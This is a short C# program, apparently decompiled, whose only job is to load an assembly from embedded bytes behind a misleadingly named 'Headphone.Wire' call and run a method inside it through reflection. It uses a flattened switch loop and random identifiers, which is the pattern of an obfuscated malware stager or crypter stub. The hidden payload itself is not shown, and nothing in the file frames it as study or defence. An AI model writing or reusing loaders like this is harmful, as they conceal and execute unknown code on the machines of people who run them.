using System;
using System.Linq;
using System.Reflection;

namespace Jhsrgk;

internal class Program
{
	private static void Main()
	{
		Lox();
	}

	private static void Lox()
	{
		object obj = null;
		int num = 0;
		while (true)
		{
			switch (num)
			{
			case 1:
				obj = Assembly.Load(Headphone.Wire().Values.ToArray());
				break;
			case 2:
				obj = (obj as Assembly).GetType("Ikpsqlxjmuwkqcobb.Fsxedvey");
				break;
			case 3:
				obj = (obj as Type).GetMethod("Dybgydmsjtamg");
				break;
			case 4:
				Delegate.CreateDelegate(typeof(Action), obj as MethodInfo).DynamicInvoke();
				break;
			case 5:
				return;
			}
			num++;
		}
	}
}
